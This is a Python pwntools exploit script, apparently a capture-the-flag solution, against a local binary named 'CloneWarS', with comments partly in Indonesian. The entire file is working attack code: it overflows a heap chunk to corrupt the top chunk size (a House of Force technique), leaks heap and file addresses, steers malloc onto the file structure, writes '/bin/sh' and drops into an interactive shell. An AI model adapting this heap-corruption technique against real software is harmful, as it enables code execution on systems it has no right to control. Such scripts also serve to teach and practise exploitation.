from pwn import *

p = process("./CloneWarS")

def prep_starship(size, kind, capacity):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Master, the amount of starships: ", str(size))
    p.sendlineafter("What kind of starships?: ", kind)
    p.sendlineafter("Capacity of troopers in the starships: ", str(capacity))

def leak_heap(someshit):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("R2? ", str(someshit))
    p.recvuntil("R2D2 IS .... ")
    leak = int(p.recvuntil(" "))
    return leak

def leak_file():
    p.sendlineafter("Your choice: ", "6")
    p.recvuntil("File is at: ")
    return int(p.recvline()[:-1])

def build_deathstar(size):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Assemble death star: ", str(size))

def make_troppers(text):
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("What kind of troopers?: ", text)

def darkside():
    p.sendlineafter("Your choice: ", "6")

def exploit():
    prep_starship(8, 'ff' * 36, 36) # memset(malloc(8), 'ff' * 36, 36) meng overwrite top chunk, size 8 namun kita bisa isi dengan 36 'ff'
    heap_leak = leak_heap("thx")
    log.info("Heap leak : {}".format(hex(heap_leak)))
    
    heap_base = heap_leak - 0x1380 # heap base
    long_size = 0x8 # size of long
    wilderness_offset = 0x1280 # wilderness offset
    top_chunk = heap_base + wilderness_offset + long_size * 4 # rumus untuk kalkulasi top chunk
    log.info("Heap base : {}".format(hex(heap_base)))
    log.info("Top chunk address : {}".format(hex(top_chunk)))

    file_addr = leak_file()
    log.info("File leak : {}".format(hex(file_addr)))
    log.info("Size to allocate : {}".format(hex(file_addr - top_chunk)))
    p.sendlineafter("Your choice: ", "2")
    build_deathstar(file_addr - top_chunk) # size yang tepat agar malloc selanjutnya berada di address file
    make_troppers("/bin/sh\x00")
    darkside()
    darkside()

    # gdb.attach(p)

    p.interactive()

if __name__ == "__main__":
    exploit()